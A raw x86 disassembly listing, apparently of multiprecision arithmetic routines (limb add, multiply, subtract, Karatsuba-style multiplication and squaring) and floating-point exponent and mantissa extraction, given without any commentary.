cmp ebx, dword [arg_18h]
jl 0x808c830
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], ecx
mov dword [var_8h], eax
call fcn.0808c2a0
jmp 0x808c842
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808c842
xor edx, edx
cmp edx, dword [arg_10h]
jge 0x808c814
lea esi, [esi]
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [edi + edx*4], eax
inc edx
cmp edx, dword [arg_10h]
jl 0x808c8a0
jmp 0x808c814
mov dword [var_ch], eax
mov edx, dword [arg_ch]
mov dword [esp], edi
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cae0
jmp 0x808c816
mov ecx, dword [arg_18h]
mov edx, dword [arg_14h]
lea ebx, [ecx*8 + 0x10]
sub esp, ebx
mov dword [var_ch], ecx
lea eax, [var_23h]
mov dword [var_8h], edx
mov ecx, dword [arg_ch]
and eax, 0xfffffff0
mov dword [esp], edi
mov dword [var_18h], eax
mov dword [var_sp_10h], eax
mov dword [var_4h], ecx
call fcn.0808cc10
mov eax, dword [arg_18h]
mov edx, dword [arg_18h]
sub dword [arg_10h], edx
shl eax, 2
add dword [arg_ch], eax
add edi, eax
cmp dword [arg_10h], edx
jl 0x808c9d8
sub esp, ebx
mov dword [var_20h], eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
mov dword [var_1ch], ecx
cmp dword [arg_18h], 0x1f
jg 0x808cab3
mov eax, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov eax, dword [var_1ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cb40
mov edx, dword [var_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_ch], eax
call fcn.0808c2a0
mov ecx, dword [var_20h]
mov dword [var_14h], eax
mov esi, dword [arg_18h]
lea ebx, [ecx + edi]
mov ecx, dword [var_1ch]
add ecx, dword [var_20h]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca90
mov esi, dword [arg_18h]
dec esi
je 0x808c9c0
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca90
dec esi
jne 0x808c9a5
nop
lea esi, [esi]
mov edx, dword [arg_18h]
add edi, dword [var_20h]
sub dword [arg_10h], edx
mov eax, dword [var_20h]
add dword [arg_ch], eax
cmp dword [arg_10h], edx
jge 0x808c930
mov eax, dword [arg_10h]
test eax, eax
jne 0x808c9e9
mov edx, dword [var_10h]
mov eax, dword [edx]
jmp 0x808c851
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edx, dword [arg_18h]
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov ecx, dword [arg_14h]
mov eax, dword [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808c7c0
mov dword [esp], edi
mov edx, dword [arg_18h]
mov ecx, dword [var_18h]
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808c2a0
mov dword [var_14h], eax
mov ecx, dword [var_18h]
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
shl eax, 2
add ecx, eax
lea ebx, [eax + edi]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca6d
dec esi
je 0x808c9df
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca6d
dec esi
jne 0x808ca56
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9df
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9df
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ca80
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9c0
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9c0
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808caa3
jmp 0x808c9c0
mov edx, dword [var_18h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_14h]
mov dword [var_sp_10h], edx
mov dword [var_ch], ecx
mov edx, dword [arg_ch]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cc10
jmp 0x808c95a
nop
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
mov dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808cb00
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_10h]
mov edi, dword [arg_14h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808cbf0
je 0x808cbd9
xor eax, eax
cmp eax, edi
jge 0x808cb71
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808cb65
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808cb9f
mov edx, dword [arg_10h]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808cbc0
mov eax, 0
je 0x808cba7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808cb82
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov dword [var_ch], edi
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_8h], ecx
call fcn.0808c2a0
jmp 0x808cb94
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08090d80
jmp 0x808cb94
xor edx, edx
cmp edx, edi
jge 0x808cb71
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808cbe0
jmp 0x808cb71
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808cb73
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_14h], 1
je 0x808ccd1
mov esi, dword [arg_14h]
dec esi
cmp esi, 0x1f
jg 0x808cca8
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov ecx, dword [arg_14h]
mov eax, dword [edx + esi*4]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [arg_10h]
mov dword [var_4h], eax
call fcn.08090d80
mov ecx, dword [arg_14h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_ch]
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cc49
mov esi, dword [arg_14h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d03c
mov edx, dword [arg_10h]
lea eax, [esi*4]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cb40
mov eax, dword [arg_ch]
mov dword [var_8h], esi
lea ebx, [eax + esi*4]
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d016
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.0808d570
mov dword [var_bp_10h], 0
mov ecx, dword [arg_10h]
lea edi, [esi*4]
mov dword [var_8h], esi
mov ebx, ecx
mov dword [var_4h], ecx
add ebx, edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808cff5
mov eax, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
add eax, edi
mov dword [esp], eax
call fcn.0808d570
xor dword [var_bp_10h], 1
cmp esi, 0x1f
jg 0x808cfc9
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
lea eax, [ecx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [esp], eax
call fcn.0808cb40
test esi, esi
jle 0x808cdd5
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov edx, esi
lea ebx, [ecx + esi*4]
lea ecx, [ecx + eax*4]
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808cdc8
mov edi, dword [arg_14h]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov ecx, dword [arg_14h]
add edi, esi
lea eax, [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov ebx, eax
mov eax, dword [var_bp_10h]
test eax, eax
je 0x808cfa2
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808cf76
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_18h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov eax, dword [arg_18h]
mov edx, dword [arg_8h]
mov ecx, dword [arg_14h]
mov dword [var_8h], eax
lea eax, [edx + esi*4]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808ceb0
mov eax, dword [arg_8h]
mov dword [var_14h], esi
lea ecx, [eax + edi*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808cf50
mov edx, esi
dec edx
mov dword [var_14h], edx
je 0x808ceb0
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf50
dec dword [var_14h]
jne 0x808ce98
xor edx, edx
cmp edx, esi
jge 0x808cec7
mov ecx, dword [arg_18h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ceb6
mov edx, dword [arg_18h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808cca0
mov eax, dword [arg_14h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808cf2b
dec ebx
je 0x808cca0
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf2b
dec ebx
jne 0x808cf14
jmp 0x808cca0
cmp ecx, esi
je 0x808cca0
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808cca0
mov esi, esi
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf40
jmp 0x808cca0
cmp ecx, edi
je 0x808ceb0
mov ebx, dword [var_14h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808ceb0
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf66
jmp 0x808ceb0
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_ch]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808ce4f
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
jmp 0x808ce29
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [edx + esi*4]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808cdb6
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
add eax, edi
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0808d570
jmp 0x808cd90
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0808d570
mov dword [var_bp_10h], 1
jmp 0x808cd4a
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [esi*4]
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cd0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_ch]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808d130
je 0x808d119
xor eax, eax
cmp eax, edi
jge 0x808d0b1
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808d0a5
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808d0df
mov edx, dword [arg_ch]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808d100
mov eax, 0
je 0x808d0e7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808d0c2
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edi
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [esp], ebx
call fcn.0808c2a0
jmp 0x808d0d4
lea esi, [esi]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808d0d4
xor edx, edx
cmp edx, edi
jge 0x808d0b1
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808d120
jmp 0x808d0b1
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808d0b3
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_10h], 1
mov edi, dword [arg_ch]
je 0x808d1f1
mov esi, dword [arg_10h]
dec esi
cmp esi, 0x1f
jg 0x808d1d5
mov eax, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.0808d080
mov eax, dword [edi + esi*4]
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov eax, dword [edi + esi*4]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
call fcn.08090d80
mov ecx, dword [arg_10h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_14h]
mov ecx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [esp], ecx
call fcn.0808d150
jmp 0x808d182
mov esi, dword [arg_10h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d494
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
lea eax, [edi + esi*4]
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d080
lea ebx, [edi + esi*4]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d47d
mov eax, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], edi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.0808d570
cmp esi, 0x1f
jg 0x808d458
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808d080
test esi, esi
jle 0x808d28d
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
lea ebx, [edx + esi*4]
lea ecx, [edx + eax*4]
mov edx, esi
mov esi, esi
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808d280
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, esi
lea eax, [ecx + edx*4]
mov dword [var_10h], edx
mov dword [var_8h], eax
mov eax, dword [arg_10h]
shl eax, 2
mov dword [var_14h], eax
mov eax, ecx
add eax, dword [var_14h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov ebx, eax
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808d436
mov ecx, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.0808d080
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808d368
mov eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_18h], esi
lea ecx, [edx + eax*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808d410
mov eax, esi
dec eax
mov dword [var_18h], eax
je 0x808d368
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d410
dec dword [var_18h]
jne 0x808d350
xor edx, edx
cmp edx, esi
jge 0x808d381
mov esi, esi
mov ecx, dword [arg_14h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808d370
mov edx, dword [arg_14h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808d1cd
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808d3e7
dec ebx
je 0x808d1cd
mov esi, esi
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d3e7
dec ebx
jne 0x808d3d0
jmp 0x808d1cd
cmp ecx, esi
je 0x808d1cd
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d1cd
lea esi, [esi]
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d400
jmp 0x808d1cd
cmp ecx, edi
je 0x808d368
mov ebx, dword [var_18h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d368
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d426
jmp 0x808d368
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
add eax, dword [var_14h]
mov dword [var_ch], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d2fd
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.0808d150
jmp 0x808d26c
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
jmp 0x808d248
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
mov ecx, dword [arg_8h]
mov dword [var_ch], eax
lea eax, [edi + esi*4]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d21b
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], ebx
mov ecx, dword [arg_10h]
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov edx, dword [arg_14h]
mov esi, dword [arg_8h]
cmp ebx, ecx
je 0x808d52a
cmp edx, 0x1f
jg 0x808d500
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808cb40
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
and eax, 0xfffffff0
mov dword [var_sp_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
call fcn.0808cc10
jmp 0x808d4f5
cmp edx, 0x1f
jg 0x808d541
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808d080
jmp 0x808d4f5
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
and eax, 0xfffffff0
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0808d150
jmp 0x808d4f5
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808d5a8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808d5a5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
sbb eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
sbb eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
sbb eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
sbb eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
sbb eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
sbb eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
sbb eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
sbb eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808d5a8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
sub dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808d620
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov eax, dword [arg_14h]
mov ecx, dword [arg_18h]
push ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov ebx, dword [arg_1ch]
mov dword [edi], ecx
mov edx, ebx
shr edx, 0x1f
mov dword [eax], edx
mov edx, ebx
shr edx, 0x14
and edx, 0x7ff
lea eax, [edx - 0x3ff]
mov dword [esi], eax
mov esi, ebx
and esi, 0xfffff
test edx, edx
mov dword [edi + 4], esi
jne 0x808d71b
test ecx, ecx
jne 0x808d69f
test esi, esi
jne 0x808d69f
mov eax, dword [arg_10h]
mov dword [eax], 0
pop ebx
pop esi
pop edi
mov eax, 2
leave
ret
mov esi, dword [edi + 4]
test esi, esi
je 0x808d6d9
bsr ebx, esi
mov edx, dword [edi]
xor ebx, 0x1f
sub ebx, 0xb
mov ecx, ebx
shl esi, cl
mov eax, edx
mov ecx, 0x20
sub ecx, ebx
shr eax, cl
mov ecx, ebx
or esi, eax
shl edx, cl
mov eax, 0xfffffc02
mov dword [edi + 4], esi
sub eax, ebx
mov dword [edi], edx
mov esi, dword [arg_10h]
mov dword [esi], eax
jmp 0x808d695
bsr ebx, dword [edi]
xor ebx, 0x1f
cmp ebx, 0xa
jle 0x808d702
mov eax, dword [edi]
lea ecx, [ebx - 0xb]
mov dword [edi], 0
shl eax, cl
mov dword [edi + 4], eax
mov edx, dword [arg_10h]
mov eax, 0xfffffbed
sub eax, ebx
mov dword [edx], eax
jmp 0x808d695
mov edx, dword [edi]
mov ecx, 0xb
sub ecx, ebx
mov eax, edx
shr eax, cl
lea ecx, [ebx + 0x15]
shl edx, cl
mov dword [edi + 4], eax
mov dword [edi], edx
jmp 0x808d6f4
or esi, 0x100000
mov dword [edi + 4], esi
jmp 0x808d695
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_20h]
mov edx, dword [arg_1ch]
mov eax, dword [arg_18h]
mov esi, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_18h], edx
mov ecx, dword [arg_10h]
mov dword [var_1ch], eax
mov edx, dword [arg_14h]
movzx eax, byte [var_13h]
shr al, 7
movzx eax, al
mov dword [edx], eax
movzx edx, word [var_14h]
and edx, 0x7fff
lea eax, [edx - 0x3fff]
test edx, edx
mov dword [ecx], eax
mov eax, dword [var_1ch]
mov dword [esi], eax
mov ecx, dword [var_18h]
mov dword [esi + 4], ecx
jne 0x808d7a2
test eax, eax
jne 0x808d7af
test ecx, ecx
jne 0x808d7af
mov eax, dword [arg_10h]
mov dword [eax], 0
add esp, 0x10
mov eax, 2
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [esi + 4]
and ebx, 0x7fffffff
test ebx, ebx
mov dword [esi + 4], ebx
je 0x808d7f3
bsr eax, ebx
mov edi, eax
